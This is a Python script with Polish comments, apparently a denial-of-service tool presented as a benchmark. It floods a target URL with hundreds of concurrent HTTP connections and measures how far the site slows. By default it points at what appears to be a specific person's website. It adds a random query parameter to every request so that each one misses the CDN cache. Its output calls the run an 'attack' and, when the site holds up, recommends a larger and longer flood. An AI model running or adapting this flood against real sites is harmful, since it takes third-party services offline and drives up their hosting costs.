#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ddos-bench.py

Baseline -> flood -> pomiar po ataku. Czysty Python, zero zewnetrznych bibliotek.

Uzycie:
    python3 ddos-bench.py
    python3 ddos-bench.py --conns 800 --duration 300
    python3 ddos-bench.py --engine wrk --conns 900
    python3 ddos-bench.py --url https://inna-strona.pl/ --no-cachebust

Silnik "python" = wbudowany (wolniejszy, ale nic nie trzeba instalowac).
Silnik "wrk"    = zewnetrzny program, ~10x wiecej requestow (sudo apt install wrk).
"""

from __future__ import annotations

import argparse
import http.client
import random
import shutil
import ssl
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request
from urllib.parse import urlsplit


# ----------------------------------------------------------------------
# kolory
# ----------------------------------------------------------------------
class C:
    R = "\033[31m"
    G = "\033[32m"
    Y = "\033[33m"
    B = "\033[36m"
    D = "\033[90m"
    N = "\033[0m"


def say(*a) -> None:
    print(*a)


def hr() -> None:
    print(f"{C.D}{'-' * 62}{C.N}")


UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)


# ----------------------------------------------------------------------
# probkowanie (pomiar opoznienia)
# ----------------------------------------------------------------------
def sample(url: str, n: int, cachebust: bool, timeout: float = 15.0):
    """Zwraca liste krotek (czas, status, bajty)."""
    rows = []
    for _ in range(n):
        u = url
        if cachebust:
            sep = "&" if "?" in u else "?"
            u = f"{u}{sep}cb={random.randint(0, 2 ** 31)}"

        t0 = time.perf_counter()
        status, size = 0, 0
        try:
            req = urllib.request.Request(u, headers={"User-Agent": UA, "Accept": "*/*"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read()
                status, size = r.status, len(body)
        except urllib.error.HTTPError as e:
            status = e.code
            try:
                size = len(e.read())
            except Exception:
                pass
        except Exception:
            status = 0

        rows.append((time.perf_counter() - t0, status, size))
    return rows


def summarize(rows, label: str):
    if not rows:
        return None
    times = sorted(r[0] for r in rows)
    n = len(times)
    ok = sum(1 for r in rows if r[1] == 200)
    return {
        "label": label,
        "n": n,
        "avg": sum(times) / n,
        "p50": times[max(0, int(n * 0.50) - 1)],
        "p95": times[min(n - 1, int(n * 0.95))],
        "mx": times[-1],
        "ok": ok,
        "err": n - ok,
        "bytes": sum(r[2] for r in rows),
    }


def print_row(s: dict) -> None:
    print(
        f"{s['label']:<14}{s['avg']:>8.3f}{s['p50']:>8.3f}"
        f"{s['p95']:>8.3f}{s['mx']:>8.3f}{s['ok']:>7}{s['err']:>7}"
    )


# ----------------------------------------------------------------------
# flood w Pythonie (watki + keep-alive)
# ----------------------------------------------------------------------
class FloodState:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.req = 0
        self.err = 0
        self.nbytes = 0
        self.lat: list[float] = []

    def add(self, lat: float, status: int, nbytes: int) -> None:
        with self.lock:
            self.req += 1
            if status != 200:
                self.err += 1
            self.nbytes += nbytes
            self.lat.append(lat)

    def add_error(self) -> None:
        with self.lock:
            self.req += 1
            self.err += 1


def flood_worker(
    host: str,
    port: int,
    use_tls: bool,
    path: str,
    cachebust: bool,
    stop: threading.Event,
    state: FloodState,
    ctx: ssl.SSLContext,
    timeout: float = 10.0,
) -> None:
    conn = None
    while not stop.is_set():
        try:
            if conn is None:
                if use_tls:
                    conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
                else:
                    conn = http.client.HTTPConnection(host, port, timeout=timeout)

            p = path
            if cachebust:
                sep = "&" if "?" in p else "?"
                p = f"{p}{sep}cb={random.randint(0, 2 ** 31)}"

            t0 = time.perf_counter()
            conn.request(
                "GET", p,
                headers={"User-Agent": UA, "Accept": "*/*", "Connection": "keep-alive"},
            )
            resp = conn.getresponse()
            body = resp.read()
            state.add(time.perf_counter() - t0, resp.status, len(body))
        except Exception:
            state.add_error()
            try:
                if conn:
                    conn.close()
            except Exception:
                pass
            conn = None
            time.sleep(0.01)

    try:
        if conn:
            conn.close()
    except Exception:
        pass


# ----------------------------------------------------------------------
# main
# ----------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(description="baseline vs flood vs po ataku")
    ap.add_argument("--url", default="https://lucjawojciechowska.pl/")
    ap.add_argument("--samples", type=int, default=40, help="probki przed/po")
    ap.add_argument("--during-samples", type=int, default=20, help="probki w trakcie")
    ap.add_argument("--conns", type=int, default=250, help="rownolegle polaczenia")
    ap.add_argument("--threads", type=int, default=4, help="watki (tylko silnik wrk)")
    ap.add_argument("--duration", type=int, default=120, help="sekundy floodu")
    ap.add_argument("--engine", choices=["python", "wrk"], default="python")
    ap.add_argument("--no-cachebust", action="store_true", help="nie dodawaj ?cb=...")
    args = ap.parse_args()

    cachebust = not args.no_cachebust

    parts = urlsplit(args.url)
    host = parts.hostname or ""
    use_tls = parts.scheme == "https"
    port = parts.port or (443 if use_tls else 80)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query

    if not host:
        say(f"{C.R}Zly URL: {args.url}{C.N}")
        return 1

    engine = args.engine
    if engine == "wrk" and not shutil.which("wrk"):
        say(f"{C.Y}Brak wrk w PATH — lece silnikiem python.{C.N}")
        engine = "python"

    say(f"{C.B}== ddos-bench.py =={C.N}")
    say(f"cel:        {args.url}")
    say(f"host:       {host}:{port}  tls={use_tls}")
    say(f"probki:     {args.samples} przed/po, {args.during_samples} w trakcie")
    say(f"flood:      {args.conns} polaczen, {args.duration}s, silnik={engine}")
    say(f"cachebust:  {'TAK (kazde zadanie unikalne)' if cachebust else 'nie'}")
    hr()

    ctx = ssl.create_default_context()

    # 1) baseline
    say(f"{C.B}[1/4] baseline — {args.samples} probek bez obciazenia...{C.N}")
    before = sample(args.url, args.samples, cachebust)

    # 2) start floodu
    say(f"{C.B}[2/4] start floodu...{C.N}")
    stop = threading.Event()
    state = FloodState()
    workers: list[threading.Thread] = []
    wrk_proc = None
    t_start = time.time()

    if engine == "python":
        for _ in range(args.conns):
            t = threading.Thread(
                target=flood_worker,
                args=(host, port, use_tls, path, cachebust, stop, state, ctx),
                daemon=True,
            )
            t.start()
            workers.append(t)
    else:
        wrk_proc = subprocess.Popen(
            [
                "wrk", "-t", str(args.threads), "-c", str(args.conns),
                "-d", f"{args.duration}s", "--latency",
                "-H", f"User-Agent: {UA}", args.url,
            ],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        )

    time.sleep(5)

    # 3) pomiar w trakcie
    say(f"{C.B}[3/4] probkuje pod obciazeniem...{C.N}")
    during = sample(args.url, args.during_samples, cachebust)

    # progres + doczekanie konca
    if engine == "python":
        while True:
            elapsed = time.time() - t_start
            if elapsed >= args.duration:
                break
            time.sleep(1)
            with state.lock:
                done, errs = state.req, state.err
            rps = done / max(elapsed, 0.001)
            print(
                f"\r{C.D}    {elapsed:5.0f}s/{args.duration}s  "
                f"{rps:7.0f} req/s  wyslane: {done}  bledy: {errs}{C.N}",
                end="",
                flush=True,
            )
        print()
        stop.set()
        for t in workers:
            t.join(timeout=3)
    else:
        elapsed = time.time() - t_start
        if args.duration - elapsed > 0:
            say(f"{C.D}    czekam na koniec floodu...{C.N}")
        wrk_out, _ = wrk_proc.communicate()

    # 4) pomiar po
    say(f"{C.B}[4/4] pomiar po ataku...{C.N}")
    after = sample(args.url, args.samples, cachebust)

    # ---------------- wyniki ----------------
    s_before = summarize(before, "PRZED")
    s_during = summarize(during, "W TRAKCIE")
    s_after = summarize(after, "PO")

    print()
    hr()
    print(f"{'FAZA':<14}{'AVG[s]':>8}{'p50':>8}{'p95':>8}{'MAX':>8}{'OK':>7}{'BLAD':>7}")
    hr()
    for s in (s_before, s_during, s_after):
        if s:
            print_row(s)
    hr()

    # raport silnika
    if engine == "python":
        with state.lock:
            done, errs, nbytes = state.req, state.err, state.nbytes
            lats = sorted(state.lat)
        if lats:
            p95 = lats[min(len(lats) - 1, int(len(lats) * 0.95))]
            say(f"{C.B}--- raport floodu (python) ---{C.N}")
            say(f"  wyslane zadania: {done}   bledy: {errs}")
            say(f"  srednia: {sum(lats)/len(lats):.3f}s   p95: {p95:.3f}s")
            rps = done / max(time.time() - t_start, 0.001)
            say(f"  srednie tempo: {rps:.0f} req/s")
            say(f"  {C.D}transfer/dobe: ~{rps * 86400 * (nbytes / max(done, 1)) / 1024 / 1024 / 1024:.1f} GB{C.N}")
    else:
        say(f"{C.B}--- raport wrk ---{C.N}")
        for line in (wrk_out or "").splitlines():
            if any(k in line for k in ("requests in", "Requests/sec", "Transfer/sec",
                                       "Latency", "Socket errors", "Non-2xx")):
                say("  " + line.strip())
        for line in (wrk_out or "").splitlines():
            if "Requests/sec:" in line:
                try:
                    rps = float(line.split("Requests/sec:")[1].strip())
                    say(f"  {C.D}~{rps * 60:.0f} req/min | ~{rps * 86400:.0f} req/dobe{C.N}")
                except ValueError:
                    pass

    # ---------------- wniosek ----------------
    print()
    if s_before and s_during and s_before["avg"] > 0:
        ratio = s_during["avg"] / s_before["avg"]
        ratio_after = s_after["avg"] / s_before["avg"] if s_after else 0
        say(f"spowolnienie w trakcie: {C.B}x{ratio:.2f}{C.N}   (po ataku: x{ratio_after:.2f})")
        print()
        if ratio < 1.25:
            say(f"{C.G}WNIOSEK:{C.N} strona nawet nie drgnela. CDN polknal atak.")
            say("  -> zwieksz:  --conns 900 --duration 600")
        elif ratio < 2.0:
            say(f"{C.Y}WNIOSEK:{C.N} delikatne spowolnienie — jestes na granicy czulosci.")
        else:
            say(f"{C.R}WNIOSEK:{C.N} realne przeciazenie x{ratio:.2f}.")

    print()
    say(f"{C.D}Kazde 'cb=' to cache MISS na edge — dlatego domyslnie wlaczone.{C.N}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{C.Y}przerwane{C.N}")
        sys.exit(130)
